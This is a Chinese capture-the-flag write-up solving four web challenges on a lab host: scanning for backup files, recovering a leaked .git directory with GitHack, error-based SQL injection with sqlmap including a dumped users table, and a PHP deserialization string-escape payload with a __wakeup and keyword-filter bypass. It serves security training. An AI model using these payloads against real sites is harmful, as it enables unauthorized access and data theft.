---
title: 随缘的WEB Write-up
urlname: suiyuan
date: 2020-9-20 16:18:25
updated: 
comments: true
tags: 
  - SQL
  - PHP
categories: 
  - Write-Up
permalink: 
---



by:gyy

<h2>WEB-常见的搜集</h2>
<h3>信息收集</h3>
题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a>

<hr />
敏感文件
Hello, CTFer!
信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西

hack fun

<hr />
<h4>yysy,确实</h4>
信息收集
<h5>Part1</h5>
遇事不决，先扫为敬
真·找到了
<pre><code>/.index.php.swp
</code></pre>
知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！

进去访问下载
<? php echo 'flag3:cDBydGFudF9oYWNr}';?>

发现flag3，说明flag分为好多部分
<h5>Part2</h5>
扫描还扫到了
<pre><code>/index.php~
</code></pre>
直接访问得
flag2:c192M3J5X2lt
<h5>Part3</h5>
将扫描进行到底
还扫到了
<pre><code>/robots.txt
</code></pre>
进去康康
<pre><code>User-agent: *
Disallow:
/flag1_is_her3_fun.txt
</code></pre>
访问得
flag1:aW5mb18x
<h3>最终</h3>
组合得flag
<h5>小结</h5>
扫就完事了
<h2>WEB-粗心的小李</h2>
<h3>Git泄露</h3>
题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a>

<hr />
Git测试
Hello, CTFer!
当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。

小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(

very easy

<hr />
<h4>Git</h4>
访问<code>./.git</code>发现跳转到了<code>./.git/</code>
根据题目是git泄露
<h5>神器Git Hack</h5>
命令：
<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"
</code></pre>
扒下来.git文件
<h5>分析</h5>
命令看一下
<pre><code>$ git log --reflog
commit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)
Author: Veneno <593220746@qq.com>
Date:   Wed Dec 4 11:04:14 2019 +0800

flag
</code></pre>
发现有flag
恢复一下（注意，这里要往上一个目录）
<pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88
HEAD is now at 213b7e3 flag
</code></pre>
恢复了<code>index.html</code>
<h3>最终</h3>
在<code>index.html</code>里找到flag

问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}
<h5>小结</h5>
Git hack好用，还有个git extrack

<hr />
<h2>WEB-SQL注入-1</h2>
<h3>SQL注入</h3>
题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a>

<hr />
<h4>SQLmap真香</h4>
<h5>sql注入不说了</h5>
sqlmap直接跑
由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>
跑sqlmap
<pre><code>$ python2 sqlmap.py -r 1.txt
</code></pre>
出结果
<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:
</code></pre>

<hr />
<pre><code>Parameter: #1* ((custom) POST)
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</code></pre>
<h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5>
<hr />
<pre><code> [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0
</code></pre>
ok，直接全扒下来<code>--dump</code>
<pre><code>Database: note
Table: users
[2 entries]
+----+----------------------------------+----------+
| id | passwd                           | username |
+----+----------------------------------+----------+
| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     |
| 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |
+----+----------------------------------+----------+
</code></pre>
<h3>最终</h3>
<h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>
问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}
<h5>小结</h5>
善用Sqlmap，能跑出来的不多了...

<hr />
<h2>Unserialize++</h2>
<h3>反序列化字符串逃逸</h3>
guest.php
先上payload打到admin，字符串逃逸成功
<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4>
<h3>index.php中</h3>
<pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));
</code></pre>
而
<pre><code>function put($data){
$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);
return $data;
}
</code></pre>
每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从
<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}'
</code></pre>
的分号开始

本地./caches/下的内容
<pre><code>O:7:"someone":3:{s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}";s:8:"uuuuuuadmin";i:0;}
</code></pre>
即后get
<pre><code>function get($data){
$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);
return $data;
}
</code></pre>
会读取
<pre><code>"O:7:\"someone\":3:{s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;}\";s:8:\"\\u0000*\\u0000admin\";i:0;}"
</code></pre>
忽略不可见字符后
读取到其中
<pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA
 [your_pass:protected] => AA 
 [admin:protected] => 1
</code></pre>
然而本题和admin<strong>没有</strong>任何关系
<h3>构造</h3>
<pre><code>O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}
</code></pre>
payload =
your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}

<hr />
check不允许匹配到"username"字符串

于是准备绕过
类型的字符S使用大写
u=\75

<hr />
level2中有__wakeup()方法，于是绕过
<pre><code>O:6:"level2":2
</code></pre>
例如本题，
<pre><code>O:7:"someone":3:{s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}";s:8:"uuuuuuadmin";i:0;}
</code></pre>
我们有u x60，最后换成字符30个，于是反序列化会继续向下读取
<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）
</code></pre>
然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸
<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}|（到此为止）
</code></pre>
下面无用了，因为}正常闭合，反序列化结束
<pre><code>";s:8:"uuuuuuadmin";i:0;}
</code></pre>
以上是admin的方法，取flag原理方法同上
<h3>最终</h3>
payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}

再访问./guest.php解决

问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}
<h5>小结：</h5>
字符串逃逸字符个数<strong>一定</strong>要算好！（吐血